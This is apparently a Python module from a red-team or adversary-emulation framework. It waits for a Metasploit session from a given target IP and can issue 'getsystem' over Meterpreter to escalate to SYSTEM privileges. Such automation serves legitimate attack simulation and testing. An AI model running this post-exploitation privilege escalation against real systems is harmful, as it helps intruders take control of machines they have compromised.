""" 
Wait for an Metasploit session (Meterpreter or Shell) with a given IP address
"""
from time import sleep
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient

def run(client, ip_address='', need_privilege=False, meterpreter=True, time_out_sec = 180):
    """
    Given an IP, waits for session, else return None if timeout
    \n:param client: MsfRpcClient object
    \n:param ip_address: target's IP address
    \n:param need_privilege: set to true if need privileged session
    \n:param meterpreter: set to False if Shell is needed
    \n:param time_out_sec: time out in seconds
    \n:return type: integer (session id) else None
    """
    time_out = time_out_sec
    while time_out > 0:
        for key, value in client.sessions.list.items():
            if(ip_address in str(value)):
                shell = client.sessions.session(key)
                if(meterpreter is True and 'MeterpreterSession' not in str(type(shell))):
                    continue # eg. target can hv both Shell & Meterpreter session
                if(not need_privilege):
                    r = ''
                    while True:
                        shell.write('getpid\n')
                        sleep(2)
                        if 'Current' in shell.read():
                            sleep(5)
                            return key
                else: # MSF is rather different from Empire
                    shell.write('getsystem\n') # needs explicit getsystem
                    r = shell.read()
                    while 'Unknown command' in r: # session needs a while to settle
                        shell.write('getsystem\n')
                        sleep(5)
                        r = shell.read()
                        print(r)
                    if ("denied" in r or 'failed' in r): 
                        shell.write('whoami')
                        raise ValueError('getsystem failed')
                    if (time_out < 0):
                        raise ValueError('Wait for session timeout')                        
                    if("got system" in r): # return only when got system
                        sleep(10) # let session fully establish
                        return key
            
        time_out -= 1
        sleep(1)
    return None


# for unit testing of each technique
if __name__ == '__main__':
    client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
    #print(str(run(client, '192.168.181.174'))) # session that's non-privileged
    print(str(run(client, need_privilege=True))) # session without high-integrity